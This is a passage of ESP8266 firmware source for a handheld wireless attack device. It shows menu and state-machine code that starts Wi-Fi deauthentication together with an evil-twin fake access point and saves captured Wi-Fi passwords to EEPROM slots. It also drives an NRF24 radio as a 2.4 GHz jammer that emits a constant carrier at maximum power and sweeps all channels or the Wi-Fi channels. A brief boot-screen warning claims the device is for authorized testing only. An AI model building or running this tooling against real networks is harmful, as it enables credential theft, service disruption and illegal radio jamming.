                case 0: wiphi_stopEvilTwin(); wiphi_startDeauth(); wiphi_ui_state = UI_RUNNING; wiphi_drawRunning(); break;
                case 1: wiphi_startDeauth();  wiphi_startEvilTwin(); wiphi_ui_state = UI_RUNNING; wiphi_drawRunning(); break;
                case 2: wiphi_stopDeauth(); wiphi_stopEvilTwin(); wiphi_ui_state = UI_MAIN_MENU; wiphi_menuSel = 2; wiphi_drawMainMenu(); break;
                case 3: wiphi_ui_state = UI_MAIN_MENU; wiphi_menuSel = 2; wiphi_drawMainMenu(); break;
            }
        }
        if (displayUI.backBtn->clicked()) { wiphi_ui_state = UI_MAIN_MENU; wiphi_menuSel = 2; wiphi_drawMainMenu(); }
    } break;

    case UI_RUNNING: {
        static unsigned long lastDraw = 0;
        if (millis() - lastDraw > 500) { wiphi_drawRunning(); lastDraw = millis(); }

        if (_wiphi_correct != "") { wiphi_ui_state = UI_CAPTURED; wiphi_drawCaptured(); break; }

        if (displayUI.backBtn->clicked() || displayUI.enterBtn->clicked()) {
            wiphi_atkSel = 2;
            wiphi_ui_state = UI_ATTACK_MENU;
            wiphi_drawAttackMenu();
        }
    } break;

    case UI_CAPTURED: {
        if (displayUI.backBtn->clicked() || displayUI.enterBtn->clicked()) {
            wiphi_ui_state = UI_MAIN_MENU;
            wiphi_menuSel  = 3;
            wiphi_drawMainMenu();
        }
    } break;

    case UI_PW_LIST: {
        bool chg = false;
        if (displayUI.upBtn->clicked())   { if (wiphi_pwSel > 0) { wiphi_pwSel--; chg = true; } }
        if (displayUI.downBtn->clicked()) { if (wiphi_pwSel < WIPHI_EE_SLOTS - 1) { wiphi_pwSel++; chg = true; } }
        if (chg) wiphi_drawPwList();

        if (displayUI.enterBtn->clicked()) {
            SavedPW s = wiphi_eeReadSlot(wiphi_pwSel);
            if (s.valid) {
                wiphi_ui_state = UI_PW_DETAIL;
                wiphi_drawPwDetail(wiphi_pwSel);
            }
        }
        if (displayUI.backBtn->clicked()) {
            wiphi_ui_state = UI_MAIN_MENU;
            wiphi_menuSel  = 4;
            wiphi_drawMainMenu();
        }
    } break;

    case UI_PW_DETAIL: {
        if (displayUI.enterBtn->clicked()) {
            wiphi_ui_state = UI_PW_LIST;
            wiphi_drawPwList();
        }
        if (displayUI.backBtn->clicked()) {
            wiphi_eeDeleteSlot(wiphi_pwSel);
            wiphi_ui_state = UI_PW_LIST;
            wiphi_drawPwList();
        }
    } break;

    default:
        wiphi_ui_state = UI_MAIN_MENU;
        wiphi_menuSel  = 0;
        wiphi_drawMainMenu();
        break;
    }
}

/* 16x16 Bitmap Example */
const unsigned char myBitmap [] PROGMEM =
{
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x01, 0x0f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x03, 0x87, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x03, 0x07, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x07, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x1c, 0x06, 0x01, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x03, 0x9c, 0x70, 0x71, 0xce, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x03, 0xbc, 0x90, 0x59, 0xcc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x7f, 0xf0, 0xff, 0xc0, 0xc0, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x7f, 0xf8, 0xff, 0xf1, 0xe0, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x7f, 0xfc, 0xff, 0xf9, 0xe0, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x7f, 0xfe, 0xff, 0xfd, 0xe0, 0x78, 0x00, 0x01, 0xf0, 0x00, 0x03, 0xe0, 0x00, 0x00, 0x70, 0x38, 
	0x70, 0x1e, 0xf0, 0x3d, 0xe0, 0x78, 0x3f, 0xc7, 0xfc, 0x7f, 0xcf, 0xf9, 0xff, 0x73, 0xf8, 0xfe, 
	0x70, 0x3e, 0xf0, 0x3d, 0xff, 0xf8, 0x38, 0xe6, 0x0e, 0x61, 0xcc, 0x1c, 0x38, 0x77, 0x81, 0xc6, 
	0x7f, 0xfc, 0xf0, 0x3d, 0xff, 0xf8, 0x30, 0x66, 0x06, 0x60, 0xdc, 0x1c, 0x30, 0x77, 0x01, 0xc0, 
	0x7f, 0xfc, 0xf0, 0x3d, 0xff, 0xf8, 0x38, 0xe6, 0x06, 0x7f, 0xdc, 0x1c, 0x30, 0x77, 0x01, 0xf8, 
	0x79, 0xf0, 0xf0, 0x3d, 0xe0, 0x78, 0x3f, 0xc6, 0x06, 0x7f, 0xdc, 0x1c, 0x30, 0x77, 0x00, 0x7e, 
	0x70, 0x78, 0xff, 0xfd, 0xe0, 0x78, 0x38, 0xe6, 0x06, 0x60, 0xcc, 0x1c, 0x30, 0x77, 0x00, 0x0e, 
	0x70, 0x7c, 0xff, 0xf9, 0xe0, 0x78, 0x30, 0x67, 0xfc, 0x7f, 0xcf, 0xf8, 0x30, 0x73, 0xf9, 0xfe, 
	0x70, 0x3e, 0xff, 0xf1, 0xe0, 0x78, 0x30, 0x63, 0xfc, 0x7f, 0x8f, 0xf8, 0x30, 0x61, 0xf9, 0xfc, 
	0x70, 0x1e, 0x7f, 0xc0, 0xc0, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};



// ============================================================
//  Setup / Loop
// ============================================================
void setup() {

    Wire.begin(I2C_SDA, I2C_SCL);

    display.begin(0x3C, true);

    display.clearDisplay();

    /* Draw bitmap */
    display.drawBitmap(
        0,              // X position
        0,              // Y position
        myBitmap,        // Bitmap array
        128,              // Width
        64,              // Height
        SH110X_WHITE
    );

    display.display();

		delay(1500);

		display.clearDisplay();

display.setTextSize(1);
display.setTextColor(SH110X_WHITE);

display.setCursor(0,0);

display.println("WARNING");
display.println("");
display.println("This device is built");
display.println("for research,");
display.println("education and");
display.println("authorized security");
display.println("testing only.");
display.display();
delay(2000);
display.clearDisplay();

display.setCursor(0,0);
display.println("Unauthorized use");
display.println("may violate law.");
display.display();
delay(2000);
    randomSeed(os_random());
    Serial.begin(115200);
    Serial.println();

    prnt(SETUP_MOUNT_SPIFFS);
    LittleFS.begin();
    prntln(SETUP_OK);

    EEPROMHelper::begin(EEPROM_SIZE);

#ifdef FORMAT_SPIFFS
    prnt(SETUP_FORMAT_SPIFFS);
    LittleFS.format();
    prntln(SETUP_OK);
#endif

#ifdef FORMAT_EEPROM
    prnt(SETUP_FORMAT_EEPROM);
    EEPROMHelper::format(EEPROM_SIZE);
    prntln(SETUP_OK);
#endif

    if (!EEPROMHelper::checkBootNum(BOOT_COUNTER_ADDR)) {
        prnt(SETUP_FORMAT_SPIFFS);
        LittleFS.format();
        prntln(SETUP_OK);

        prnt(SETUP_FORMAT_EEPROM);
        EEPROMHelper::format(EEPROM_SIZE);
        prntln(SETUP_OK);

        EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
    }

    currentTime = millis();

    #ifndef RESET_SETTINGS
    settings::load();
    #else
    settings::reset();
    settings::save();
    #endif

    if (settings::getDisplaySettings().enabled) {
        displayUI.setup();
        displayUI.mode = DISPLAY_MODE::OFF;
        drawMainMenu();
    }

    prntln(SETUP_STARTED);
    prntln(DEAUTHER_VERSION);
}

void loop() {
    currentTime = millis();

    switch (appMode) {
        case AppMode::MAIN_MENU:      updateMainMenu();      break;
        case AppMode::NRF_MENU:       updateNrfMenu();       break;
        case AppMode::NRF_RUNNING:    updateNrfRunning();    break;
        case AppMode::DEAUTHER_SUITE: updateDeautherSuite(); break;
        case AppMode::WIPHI_APP:      updateWiPhiApp();      break;
    }
}

void updateButtons() {
    if (!displayUI.upBtn) return;

    displayUI.upBtn->update();
    displayUI.downBtn->update();
    displayUI.leftBtn->update();
    displayUI.rightBtn->update();
    displayUI.enterBtn->update();
    displayUI.backBtn->update();
}

void drawMainMenu() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "Main Menu");

    for (int i = 0; i < MAIN_MENU_COUNT; i++) {
        String row = (i == mainSelected ? "> " : "  ");
        row += MAIN_MENU_ITEMS[i];
        displayUI.drawString(i + 1, row);
    }

    displayUI.updateSuffix();
}

void drawNrfBootScreen() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "RF Hunter");
    displayUI.drawString(1, "NRF-Functions");
    displayUI.drawString(2, "Initializing...");
    displayUI.updateSuffix();
}

void drawNrfError() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "RF Hunter");
    displayUI.drawString(1, "NRF Error!");
    displayUI.drawString(3, "BACK main menu");
    displayUI.updateSuffix();
}

void drawNrfMenu() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "RF-Functions");
    displayUI.drawString(1, "Select Attack:");

    for (int i = 0; i < NRF_MODE_COUNT; i++) {
        String row = (i == nrfSelected ? "> " : "  ");
        row += NRF_MODES[i].label;
        displayUI.drawString(0, 24 + i * 12, row);
    }

    displayUI.updateSuffix();
}

void drawNrfRunning() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "Running:");
    if (activeNrfMode >= 0) displayUI.drawString(1, NRF_MODES[activeNrfMode].label);
    displayUI.drawString(3, "BACK to stop");
    displayUI.drawString(4, "Hold BACK menu");
    displayUI.updateSuffix();
}

bool setupNrfRadio() {
    if (nrfReady) return true;

    drawNrfBootScreen();

    if (!radio.begin()) {
        Serial.println("[ERROR] NRF24 init failed!");
        drawNrfError();
        return false;
    }

    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    nrfReady = true;

    displayUI.drawString(70, 24, "OK");
    displayUI.updateSuffix();
    delay(800);

    return true;
}

void startCarrier() {
    if (!carrierActive) {
        radio.powerUp();
        delay(5);
        radio.startConstCarrier(RF24_PA_MAX, NRF_CARRIER_CH);
        carrierActive = true;
    }
}

void stopCarrier() {
    if (carrierActive) {
        radio.stopConstCarrier();
        carrierActive = false;
    }
}

void startNrfMode(int idx) {
    if ((idx < 0) || (idx >= NRF_MODE_COUNT)) return;

    activeNrfMode = idx;
    if (NRF_MODES[idx].needsCarrier) startCarrier();
    if (NRF_MODES[idx].init) NRF_MODES[idx].init();
    appMode = AppMode::NRF_RUNNING;
    drawNrfRunning();
}

void stopNrfMode() {
    stopCarrier();
    activeNrfMode = -1;
}

void startDeautherSuite() {
    if (!deautherStarted) {
        wifi::begin();
        wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) {
            scan.sniffer(buf, len);
        });

        names.load();
        ssids.load();
        cli.load();
        scan.setup();

        if (settings::getCLISettings().enabled) {
            cli.enable();
        } else {
            prntln(SETUP_SERIAL_WARNING);
        }

        if (settings::getWebSettings().enabled) wifi::startAP();

        deautherStarted = true;
        booted = true;
        EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
    }

    appMode = AppMode::DEAUTHER_SUITE;
    displayUI.mode = DISPLAY_MODE::INTRO;
}

void returnToMainMenu() {
    if (appMode == AppMode::NRF_RUNNING) stopNrfMode();

    if (appMode == AppMode::DEAUTHER_SUITE) {
        attack.stop();
        scan.stop();
    }

    if (appMode == AppMode::WIPHI_APP && wiphi_started) {
        stopWiPhiApp();
    }

    appMode = AppMode::MAIN_MENU;
    displayUI.mode = DISPLAY_MODE::OFF;
    mainSelected = 0;
    nrfSelected = 0;
    drawMainMenu();
}

void updateMainMenu() {
    updateButtons();
    if (!displayUI.upBtn) return;

    if (displayUI.upBtn->clicked()) {
        mainSelected = (mainSelected + MAIN_MENU_COUNT - 1) % MAIN_MENU_COUNT;
        drawMainMenu();
    } else if (displayUI.downBtn->clicked()) {
        mainSelected = (mainSelected + 1) % MAIN_MENU_COUNT;
        drawMainMenu();
    } else if (displayUI.enterBtn->clicked()) {
        if (mainSelected == 0) {
            if (setupNrfRadio()) {
                appMode = AppMode::NRF_MENU;
                nrfSelected = 0;
                drawNrfMenu();
            }
        } else if (mainSelected == 1) {
            startDeautherSuite();
        } else {
            startWiPhiApp();
        }
    }
}

void updateNrfMenu() {
    updateButtons();
    if (!displayUI.upBtn) return;

    if (displayUI.backHolding(5000)) {
        returnToMainMenu();
        return;
    }

    if (displayUI.upBtn->clicked()) {
        nrfSelected = (nrfSelected + NRF_MODE_COUNT - 1) % NRF_MODE_COUNT;
        drawNrfMenu();
    } else if (displayUI.downBtn->clicked()) {
        nrfSelected = (nrfSelected + 1) % NRF_MODE_COUNT;
        drawNrfMenu();
    } else if (displayUI.enterBtn->clicked()) {
        startNrfMode(nrfSelected);
    } else if (displayUI.backBtn->clicked()) {
        returnToMainMenu();
    }
}

void updateNrfRunning() {
    updateButtons();
    if (!displayUI.upBtn) return;

    if (displayUI.backHolding(5000)) {
        returnToMainMenu();
        return;
    }

    if (displayUI.backBtn->clicked()) {
        stopNrfMode();
        appMode = AppMode::NRF_MENU;
        nrfSelected = 0;
        drawNrfMenu();
        return;
    }

    if ((activeNrfMode >= 0) && NRF_MODES[activeNrfMode].tick) {
        NRF_MODES[activeNrfMode].tick();
    }

    static unsigned long lastDraw = 0;
    if (millis() - lastDraw > 1000UL) {
        drawNrfRunning();
        lastDraw = millis();
    }
}

void updateDeautherSuite() {
    wifi::update();
    attack.update();
    displayUI.update();
    cli.update();
    scan.update();
    ssids.update();

    if (displayUI.backHolding(5000)) {
        returnToMainMenu();
        return;
    }

    if (settings::getAutosaveSettings().enabled
        && (currentTime - autosaveTime > settings::getAutosaveSettings().time)) {
        autosaveTime = currentTime;
        names.save(false);
        ssids.save(false);
        settings::save(false);
    }
}

void nrfAttackAllInit() {}

void nrfAttackAllTick() {
    for (int ch = 0; ch < 125; ch++) radio.setChannel(ch);
}

void nrfAttackWiFiInit() {}

void nrfAttackWiFiTick() {
    for (int i = 0; i < numWifiCh; i++) radio.setChannel(wifiChannels[i]);
}
